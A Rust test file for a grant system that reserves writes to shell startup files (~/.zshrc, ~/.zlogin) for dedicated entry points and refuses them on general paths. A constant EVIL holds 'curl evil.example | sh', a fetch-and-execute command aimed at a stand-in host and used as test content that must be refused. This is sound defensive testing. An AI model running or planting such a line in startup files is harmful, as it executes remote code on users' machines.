//! Shell startup file authorizations (`ShellStartupFile`): usable only through
//! the dedicated entry points, refused by every general path that reaches a
//! write or a read through a grant id.

use std::{fs, path::PathBuf};

use uuid::Uuid;

use crate::{
    config::{ConfigEnvironment, read::hash_bytes},
    error::{AppError, AppErrorCode},
    operations::{OperationCoordinator, OperationStatus},
    settings::BackupRetention,
};

use super::{
    ConfirmRequest, FileState, GrantCoordinator, GrantError, GrantId, GrantKind, GrantPurpose,
    GrantRecord, GrantStore, ReadError, ResourceWriteContext, ResourceWriteCoordinator, StepState,
    WriteRequest, WriteStatus,
};

const ORIGINAL: &str = "export KEEP=1\n";
const EVIL: &str = "curl evil.example | sh\n";

struct Fixture {
    root: PathBuf,
    home: PathBuf,
    environment: ConfigEnvironment,
    grants: GrantCoordinator,
    operations: OperationCoordinator,
    writes: ResourceWriteCoordinator,
}

impl Fixture {
    fn new() -> Self {
        let root = fs::canonicalize(std::env::temp_dir())
            .expect("canonical temp dir")
            .join(format!("userhome-shell-grants-{}", Uuid::new_v4()));
        let home = root.join("home");
        fs::create_dir_all(&home).expect("create home");
        let environment =
            ConfigEnvironment::new(home.clone(), root.join("brew"), home.join("backups"));
        let grants =
            GrantCoordinator::new(GrantStore::new(root.join("support")), Some(home.clone()));
        Self {
            root,
            home,
            environment,
            grants,
            operations: OperationCoordinator::default(),
            writes: ResourceWriteCoordinator::default(),
        }
    }

    fn ctx(&self) -> ResourceWriteContext<'_> {
        ResourceWriteContext {
            grants: &self.grants,
            operations: &self.operations,
            environment: &self.environment,
            retention: BackupRetention::FIVE,
        }
    }

    fn store_file(&self) -> PathBuf {
        self.root.join("support").join("grants.json")
    }

    /// `~/.zshrc` with content and a shell startup grant for it.
    fn existing(&self) -> (PathBuf, GrantRecord) {
        let file = self.home.join(".zshrc");
        fs::write(&file, ORIGINAL).expect("seed");
        let record = self
            .grants
            .create(GrantPurpose::ShellStartupFile, &file)
            .expect("shell grant");
        (file, record)
    }

    /// A shell startup new-file grant for a `~/.zlogin` that does not exist.
    fn missing(&self) -> (PathBuf, GrantRecord) {
        let record = self
            .grants
            .create_new_file_with(GrantPurpose::ShellStartupFile, &self.home, ".zlogin")
            .expect("shell new-file grant");
        (self.home.join(".zlogin"), record)
    }

    fn replace_request(&self, id: &GrantId, content: &str) -> WriteRequest {
        WriteRequest {
            grant_id: id.clone(),
            relative: None,
            expected_sha256: Some(hash_bytes(ORIGINAL.as_bytes())),
            content: content.to_owned(),
            sensitive: true,
        }
    }

    fn create_request(&self, id: &GrantId, content: &str) -> WriteRequest {
        WriteRequest {
            grant_id: id.clone(),
            relative: None,
            expected_sha256: None,
            content: content.to_owned(),
            sensitive: true,
        }
    }
}

impl Drop for Fixture {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.root);
    }
}

fn confirm(operation_id: &str, id: &GrantId) -> ConfirmRequest {
    ConfirmRequest {
        operation_id: operation_id.to_owned(),
        grant_id: id.clone(),
        relative: None,
    }
}

/// The refusal for the wrong kind of path: its own message, no path, no id.
fn assert_reserved(error: &AppError, fixture: &Fixture) {
    assert_eq!(error.code(), AppErrorCode::PermissionDenied, "{error:?}");
    let json = serde_json::to_string(error).expect("serialize");
    assert!(json.contains("dedicated"), "{json}");
    assert!(
        !json.contains(fixture.home.to_str().expect("utf8")),
        "{json}"
    );
    assert!(
        !json.contains(".zshrc") && !json.contains(".zlogin"),
        "{json}"
    );
}

// ------------------------------------------------------------- the grant

#[test]
fn a_shell_startup_grant_is_a_file_grant_with_its_own_purpose() {
    let fixture = Fixture::new();
    let (file, record) = fixture.existing();

    assert_eq!(record.purpose, GrantPurpose::ShellStartupFile);
    assert_eq!(record.kind, GrantKind::File);
    assert_eq!(record.target_path(), file);
    assert_eq!(fixture.grants.list().expect("list"), vec![record.clone()]);
    // The same file under another purpose is a different authorization.
    let general = fixture
        .grants
        .create(GrantPurpose::ConfigFile, &file)
        .expect("general grant");
    assert_ne!(general.id, record.id);
    assert_eq!(
        fixture
            .grants
            .create(GrantPurpose::ShellStartupFile, &file)
            .expect("again"),
        record
    );
}

#[test]
fn a_shell_startup_new_file_grant_keeps_parent_and_name_under_the_new_purpose() {
    let fixture = Fixture::new();
    let (file, record) = fixture.missing();

    assert_eq!(record.purpose, GrantPurpose::ShellStartupFile);
    assert_eq!(record.kind, GrantKind::File);
    assert_eq!(record.path, fixture.home);
    assert_eq!(record.file_name.as_deref(), Some(".zlogin"));
    assert_eq!(record.target_path(), file);
    assert!(!file.exists());
    assert_eq!(fixture.grants.list().expect("list"), vec![record.clone()]);
    // A plain new-file grant for the same name stays a separate grant.
    let general = fixture
        .grants
        .create_new_file(&fixture.home, ".zlogin")
        .expect("general new-file grant");
    assert_eq!(general.purpose, GrantPurpose::ConfigFile);
    assert_ne!(general.id, record.id);
}

#[test]
fn other_purposes_cannot_be_made_through_the_shell_new_file_entry() {
    let fixture = Fixture::new();
    for purpose in [GrantPurpose::ConfigDirectory, GrantPurpose::Executable] {
        assert_eq!(
            fixture
                .grants
                .create_new_file_with(purpose, &fixture.home, ".zlogin"),
            Err(GrantError::NotFile),
            "{purpose:?}"
        );
    }
    assert!(fixture.grants.list().expect("list").is_empty());
}

#[test]
fn a_grant_record_with_the_shell_purpose_must_still_be_a_file_grant() {
    let id = Uuid::new_v4();
    let record = |kind: &str| {
        format!(
            r#"{{"schemaVersion":1,"grants":[{{"id":"{id}","purpose":"SHELL_STARTUP_FILE","kind":"{kind}","path":"/tmp","createdAtEpochMs":1}}]}}"#
        )
    };
    let fixture = Fixture::new();
    fs::create_dir_all(fixture.root.join("support")).expect("support");
    fs::write(fixture.store_file(), record("DIRECTORY")).expect("store");
    assert_eq!(fixture.grants.list(), Err(GrantError::StoreCorrupt));
    fs::write(fixture.store_file(), record("FILE")).expect("store");
    assert_eq!(fixture.grants.list().expect("list").len(), 1);
}

// ----------------------------------------------------- general resolution

#[test]
fn general_resolution_and_reads_refuse_a_shell_startup_grant() {
    let fixture = Fixture::new();
    let (_, existing) = fixture.existing();
    let (_, missing) = fixture.missing();
    for record in [&existing, &missing] {
        assert_eq!(
            fixture.grants.resolve(&record.id),
            Err(GrantError::ReservedPurpose)
        );
        assert_eq!(
            fixture.grants.resolve_child(&record.id, "x"),
            Err(GrantError::ReservedPurpose)
        );
        assert_eq!(
            fixture.grants.read_resource(&record.id, None).map(|_| ()),
            Err(ReadError::Excluded)
        );
        assert_eq!(
            fixture
                .grants
                .read_resource_with_limit(&record.id, Some("x"), 16)
                .map(|_| ()),
            Err(ReadError::Excluded)
        );
    }
    let error = AppError::from(GrantError::ReservedPurpose);
    assert_reserved(&error, &fixture);
}

#[test]
fn dedicated_resolution_and_reads_accept_only_the_shell_startup_purpose() {
    let fixture = Fixture::new();
    let (file, shell) = fixture.existing();
    let general_file = fixture
        .grants
        .create(GrantPurpose::ConfigFile, &file)
        .expect("general file");
    let directory = fixture.home.join("project");
    fs::create_dir_all(&directory).expect("dir");
    let general_dir = fixture
        .grants
        .create(GrantPurpose::ConfigDirectory, &directory)
        .expect("dir grant");

    assert_eq!(
        fixture
            .grants
            .resolve_shell_startup(&shell.id)
            .expect("shell"),
        shell
    );
    let read = fixture
        .grants
        .read_shell_startup_with_limit(&shell.id, None, 1024)
        .expect("read");
    assert_eq!(read.content, ORIGINAL.as_bytes());
    for other in [&general_file, &general_dir] {
        assert_eq!(
            fixture.grants.resolve_shell_startup(&other.id),
            Err(GrantError::ReservedPurpose)
        );
        assert_eq!(
            fixture
                .grants
                .read_shell_startup_with_limit(&other.id, None, 1024)
                .map(|_| ()),
            Err(ReadError::Excluded)
        );
    }
    // A relative path never works for a file grant, even through the entry.
    assert_eq!(
        fixture
            .grants
            .read_shell_startup_with_limit(&shell.id, Some("x"), 1024)
            .map(|_| ()),
        Err(ReadError::Malformed)
    );
}

// ----------------------------------------------------- general write paths

#[test]
fn general_preview_refuses_a_shell_startup_grant_for_existing_and_missing_files() {
    let fixture = Fixture::new();
    let (file, existing) = fixture.existing();
    let (missing_file, missing) = fixture.missing();

    for request in [
        fixture.replace_request(&existing.id, EVIL),
        fixture.create_request(&missing.id, EVIL),
        // With a relative path, as a directory grant would be addressed.
        WriteRequest {
            relative: Some(".zshrc".to_owned()),
            ..fixture.replace_request(&existing.id, EVIL)
        },
        WriteRequest {
            relative: Some(".zlogin".to_owned()),
            ..fixture.create_request(&missing.id, EVIL)
        },
    ] {
        let error = fixture
            .writes
            .preview(&fixture.ctx(), vec![request])
            .expect_err("refused");
        assert_reserved(&error, &fixture);
    }
    assert_eq!(fs::read_to_string(&file).expect("read"), ORIGINAL);
    assert!(!missing_file.exists());
    assert!(fixture.operations.list().expect("operations").is_empty());
}

#[test]
fn a_batch_with_one_shell_startup_step_is_refused_as_a_whole() {
    let fixture = Fixture::new();
    let (file, shell) = fixture.existing();
    let project = fixture.home.join("project");
    fs::create_dir_all(&project).expect("project");
    fs::write(project.join("a.toml"), "a = 1\n").expect("seed");
    let directory = fixture
        .grants
        .create(GrantPurpose::ConfigDirectory, &project)
        .expect("dir grant");

    let ok_step = WriteRequest {
        grant_id: directory.id.clone(),
        relative: Some("a.toml".to_owned()),
        expected_sha256: Some(hash_bytes(b"a = 1\n")),
        content: "a = 2\n".to_owned(),
        sensitive: false,
    };
    let error = fixture
        .writes
        .preview(
            &fixture.ctx(),
            vec![ok_step, fixture.replace_request(&shell.id, EVIL)],
        )
        .expect_err("refused");
    assert_reserved(&error, &fixture);
    // The earlier step's preview was cancelled and nothing was written.
    let operations = fixture.operations.list().expect("operations");
    assert!(
        operations
            .iter()
            .all(|operation| operation.status != OperationStatus::Previewed),
        "{operations:?}"
    );
    assert_eq!(fs::read_to_string(&file).expect("read"), ORIGINAL);
    assert_eq!(
        fs::read_to_string(project.join("a.toml")).expect("read"),
        "a = 1\n"
    );
}

#[test]
fn general_execute_and_batch_status_cannot_use_a_dedicated_preview() {
    let fixture = Fixture::new();
    let (file, shell) = fixture.existing();
    let preview = fixture
        .writes
        .preview_shell_startup(
            &fixture.ctx(),
            vec![fixture.replace_request(&shell.id, "export KEEP=1\nexport A=2\n")],
        )
        .expect("dedicated preview");
    let operation_id = preview.steps[0].operation.operation_id.clone();

    // The frontend knows the operation id and the grant id, but the general
    // entries refuse the dedicated preview and leave it usable.
    let error = fixture
        .writes
        .execute(&fixture.ctx(), &confirm(&operation_id, &shell.id))
        .expect_err("refused");
    assert_reserved(&error, &fixture);
    let error = fixture
        .writes
        .execute_with(&fixture.ctx(), &confirm(&operation_id, &shell.id), |_| {
            Ok(())
        })
        .expect_err("refused");
    assert_reserved(&error, &fixture);
    let error = fixture
        .writes
        .batch_status(&fixture.operations, &preview.batch_id)
        .expect_err("refused");
    assert_reserved(&error, &fixture);
    assert_eq!(fs::read_to_string(&file).expect("read"), ORIGINAL);
    assert_eq!(
        fixture
            .operations
            .get(&operation_id)
            .expect("operation")
            .status,
        OperationStatus::Previewed
    );

    let executed = fixture
        .writes
        .execute_shell_startup(&fixture.ctx(), &confirm(&operation_id, &shell.id), |_| {
            Ok(())
        })
        .expect("dedicated execute");
    assert_eq!(executed.outcome.status, WriteStatus::Succeeded);
    assert_eq!(
        fs::read_to_string(&file).expect("read"),
        "export KEEP=1\nexport A=2\n"
    );
}

// ----------------------------------------------------- dedicated entry

#[test]
fn the_dedicated_entry_previews_and_writes_existing_and_new_files() {
    let fixture = Fixture::new();
    let (file, existing) = fixture.existing();
    let (missing_file, missing) = fixture.missing();

    let replace = fixture
        .writes
        .preview_shell_startup(
            &fixture.ctx(),
            vec![fixture.replace_request(&existing.id, "export KEEP=1\nexport B=3\n")],
        )
        .expect("preview");
    let executed = fixture
        .writes
        .execute_shell_startup(
            &fixture.ctx(),
            &confirm(&replace.steps[0].operation.operation_id, &existing.id),
            |_| Ok(()),
        )
        .expect("execute");
    assert_eq!(executed.outcome.file_state, FileState::Written);
    assert_eq!(
        fs::read_to_string(&file).expect("read"),
        "export KEEP=1\nexport B=3\n"
    );

    let create = fixture
        .writes
        .preview_shell_startup(
            &fixture.ctx(),
            vec![fixture.create_request(&missing.id, "x=1\n")],
        )
        .expect("preview");
    fixture
        .writes
        .execute_shell_startup(
            &fixture.ctx(),
            &confirm(&create.steps[0].operation.operation_id, &missing.id),
            |_| Ok(()),
        )
        .expect("execute");
    assert_eq!(fs::read_to_string(&missing_file).expect("read"), "x=1\n");
}

#[test]
fn the_dedicated_entry_refuses_grants_of_other_purposes() {
    let fixture = Fixture::new();
    let file = fixture.home.join(".zshrc");
    fs::write(&file, ORIGINAL).expect("seed");
    let general = fixture
        .grants
        .create(GrantPurpose::ConfigFile, &file)
        .expect("general");
    let project = fixture.home.join("project");
    fs::create_dir_all(&project).expect("project");
    let directory = fixture
        .grants
        .create(GrantPurpose::ConfigDirectory, &project)
        .expect("dir");

    for request in [
        fixture.replace_request(&general.id, EVIL),
        WriteRequest {
            relative: Some("x".to_owned()),
            ..fixture.create_request(&directory.id, EVIL)
        },
    ] {
        let error = fixture
            .writes
            .preview_shell_startup(&fixture.ctx(), vec![request])
            .expect_err("refused");
        assert_eq!(error.code(), AppErrorCode::PermissionDenied, "{error:?}");
    }
    assert_eq!(fs::read_to_string(&file).expect("read"), ORIGINAL);
}

#[test]
fn a_general_preview_cannot_be_confirmed_through_the_dedicated_entry() {
    let fixture = Fixture::new();
    let file = fixture.home.join(".profile-like");
    fs::write(&file, ORIGINAL).expect("seed");
    let general = fixture
        .grants
        .create(GrantPurpose::ConfigFile, &file)
        .expect("general");
    let preview = fixture
        .writes
        .preview(
            &fixture.ctx(),
            vec![fixture.replace_request(&general.id, "x\n")],
        )
        .expect("general preview");
    let operation_id = preview.steps[0].operation.operation_id.clone();

    let error = fixture
        .writes
        .execute_shell_startup(&fixture.ctx(), &confirm(&operation_id, &general.id), |_| {
            Ok(())
        })
        .expect_err("refused");
    assert_eq!(error.code(), AppErrorCode::PermissionDenied, "{error:?}");
    assert_eq!(fs::read_to_string(&file).expect("read"), ORIGINAL);
    // Still confirmable through its own entry.
    fixture
        .writes
        .execute(&fixture.ctx(), &confirm(&operation_id, &general.id))
        .expect("general execute");
}

#[test]
fn ordinary_file_and_directory_grants_keep_writing_through_the_general_entries() {
    let fixture = Fixture::new();
    let project = fixture.home.join("project");
    fs::create_dir_all(&project).expect("project");
    fs::write(project.join("a.toml"), "a = 1\n").expect("seed");
    let directory = fixture
        .grants
        .create(GrantPurpose::ConfigDirectory, &project)
        .expect("dir");
    let file = fixture.home.join("plain.toml");
    fs::write(&file, "b = 1\n").expect("seed");
    let plain = fixture
        .grants
        .create(GrantPurpose::ConfigFile, &file)
        .expect("file");
    let fresh = fixture
        .grants
        .create_new_file(&fixture.home, "fresh.toml")
        .expect("new file");

    let preview = fixture
        .writes
        .preview(
            &fixture.ctx(),
            vec![
                WriteRequest {
                    grant_id: directory.id.clone(),
                    relative: Some("a.toml".to_owned()),
                    expected_sha256: Some(hash_bytes(b"a = 1\n")),
                    content: "a = 2\n".to_owned(),
                    sensitive: false,
                },
                WriteRequest {
                    grant_id: plain.id.clone(),
                    relative: None,
                    expected_sha256: Some(hash_bytes(b"b = 1\n")),
                    content: "b = 2\n".to_owned(),
                    sensitive: false,
                },
                fixture.create_request(&fresh.id, "c = 1\n"),
            ],
        )
        .expect("preview");
    let status = fixture
        .writes
        .batch_status(&fixture.operations, &preview.batch_id)
        .expect("status");
    assert_eq!(status.total, 3);
    let targets = [
        (&directory.id, Some("a.toml".to_owned())),
        (&plain.id, None),
        (&fresh.id, None),
    ];
    for (step, (id, relative)) in preview.steps.iter().zip(targets) {
        fixture
            .writes
            .execute(
                &fixture.ctx(),
                &ConfirmRequest {
                    operation_id: step.operation.operation_id.clone(),
                    grant_id: id.clone(),
                    relative,
                },
            )
            .expect("execute");
    }
    let status = fixture
        .writes
        .batch_status(&fixture.operations, &preview.batch_id)
        .expect("status");
    assert!(
        status
            .steps
            .iter()
            .all(|step| step.state == StepState::Succeeded)
    );
    assert_eq!(
        fs::read_to_string(project.join("a.toml")).expect("read"),
        "a = 2\n"
    );
    assert_eq!(fs::read_to_string(&file).expect("read"), "b = 2\n");
    assert_eq!(
        fs::read_to_string(fixture.home.join("fresh.toml")).expect("read"),
        "c = 1\n"
    );
}

// ----------------------------------------------- default validation first

#[test]
fn a_caller_check_cannot_replace_the_default_text_validation() {
    // A new file is read back raw, so the default text validation is what
    // catches NUL bytes there; a caller check that accepts anything must not
    // switch it off.
    let fixture = Fixture::new();
    let grant = fixture
        .grants
        .create_new_file(&fixture.home, "fresh.txt")
        .expect("grant");
    let file = fixture.home.join("fresh.txt");
    let preview = fixture
        .writes
        .preview(
            &fixture.ctx(),
            vec![fixture.create_request(&grant.id, "fine\n")],
        )
        .expect("preview");
    let operation_id = preview.steps[0].operation.operation_id.clone();
    // The pending write is swapped for bytes the default check refuses, as a
    // stand-in for any content it would reject.
    fixture
        .writes
        .poison_pending_content_for_test(&operation_id, "bad\0bytes\n");

    let executed = fixture
        .writes
        .execute_with(&fixture.ctx(), &confirm(&operation_id, &grant.id), |_| {
            Ok(())
        })
        .expect("transaction ran");
    assert_eq!(executed.outcome.status, WriteStatus::Failed);
    assert_eq!(executed.outcome.file_state, FileState::CreatedRemoved);
    assert!(!file.exists());
    assert_eq!(
        executed.outcome.error.as_ref().map(AppError::code),
        Some(AppErrorCode::ValidationFailed)
    );
}

#[test]
fn a_caller_check_still_runs_after_the_default_validation_and_can_only_tighten() {
    let fixture = Fixture::new();
    let file = fixture.home.join("plain.txt");
    fs::write(&file, "ok\n").expect("seed");
    let grant = fixture
        .grants
        .create(GrantPurpose::ConfigFile, &file)
        .expect("grant");
    let preview = fixture
        .writes
        .preview(
            &fixture.ctx(),
            vec![WriteRequest {
                grant_id: grant.id.clone(),
                relative: None,
                expected_sha256: Some(hash_bytes(b"ok\n")),
                content: "fine\n".to_owned(),
                sensitive: false,
            }],
        )
        .expect("preview");
    let executed = fixture
        .writes
        .execute_with(
            &fixture.ctx(),
            &confirm(&preview.steps[0].operation.operation_id, &grant.id),
            |_| Err(AppError::validation_failed("caller says no")),
        )
        .expect("transaction ran");
    assert_eq!(executed.outcome.status, WriteStatus::Failed);
    assert_eq!(executed.outcome.file_state, FileState::Restored);
    assert_eq!(fs::read_to_string(&file).expect("read"), "ok\n");
}

// ------------------------------------------------------------ the store

fn store_with(fixture: &Fixture, grants: &[String]) -> String {
    fs::create_dir_all(fixture.root.join("support")).expect("support");
    let document = format!(r#"{{"schemaVersion":1,"grants":[{}]}}"#, grants.join(","));
    fs::write(fixture.store_file(), &document).expect("store");
    document
}

fn record_json(id: Uuid, purpose: &str, kind: &str, path: &str) -> String {
    format!(
        r#"{{"id":"{id}","purpose":"{purpose}","kind":"{kind}","path":"{path}","createdAtEpochMs":1}}"#
    )
}

#[test]
fn an_older_store_without_the_new_purpose_loads_unchanged_and_stays_version_one() {
    let fixture = Fixture::new();
    let directory = fixture.home.join("project");
    fs::create_dir_all(&directory).expect("dir");
    let old = store_with(
        &fixture,
        &[record_json(
            Uuid::new_v4(),
            "CONFIG_DIRECTORY",
            "DIRECTORY",
            directory.to_str().expect("utf8"),
        )],
    );
    assert_eq!(fixture.grants.list().expect("list").len(), 1);
    assert_eq!(
        fs::read_to_string(fixture.store_file()).expect("read"),
        old,
        "reading never rewrites the store"
    );

    // Adding a shell grant rewrites the same document at schema version 1.
    let file = fixture.home.join(".zshrc");
    fs::write(&file, ORIGINAL).expect("seed");
    fixture
        .grants
        .create(GrantPurpose::ShellStartupFile, &file)
        .expect("create");
    let saved: serde_json::Value =
        serde_json::from_str(&fs::read_to_string(fixture.store_file()).expect("read"))
            .expect("json");
    assert_eq!(saved["schemaVersion"], 1);
    let purposes: Vec<&str> = saved["grants"]
        .as_array()
        .expect("grants")
        .iter()
        .filter_map(|grant| grant["purpose"].as_str())
        .collect();
    assert_eq!(purposes, ["CONFIG_DIRECTORY", "SHELL_STARTUP_FILE"]);
    assert_eq!(fixture.grants.list().expect("list").len(), 2);
}

#[test]
fn a_store_holding_an_unknown_purpose_is_damaged_as_a_whole_and_never_overwritten() {
    // What an older build sees when it meets a purpose it does not know: the
    // whole store is classified as damaged (fail closed) and kept as it is.
    // Nothing is dropped silently and no grant is created on top of it.
    let fixture = Fixture::new();
    let directory = fixture.home.join("project");
    fs::create_dir_all(&directory).expect("dir");
    let document = store_with(
        &fixture,
        &[
            record_json(
                Uuid::new_v4(),
                "CONFIG_DIRECTORY",
                "DIRECTORY",
                directory.to_str().expect("utf8"),
            ),
            record_json(Uuid::new_v4(), "SOME_FUTURE_PURPOSE", "FILE", "/tmp/x"),
        ],
    );

    assert_eq!(fixture.grants.list(), Err(GrantError::StoreCorrupt));
    assert_eq!(
        fixture
            .grants
            .create(GrantPurpose::ConfigDirectory, &directory),
        Err(GrantError::StoreCorrupt)
    );
    assert_eq!(
        fs::read_to_string(fixture.store_file()).expect("read"),
        document
    );
}

#[test]
fn a_version_two_store_is_still_a_newer_version() {
    let fixture = Fixture::new();
    fs::create_dir_all(fixture.root.join("support")).expect("support");
    fs::write(fixture.store_file(), r#"{"schemaVersion":2,"grants":[]}"#).expect("store");
    assert_eq!(
        fixture.grants.list(),
        Err(GrantError::StoreUnsupportedVersion)
    );
}
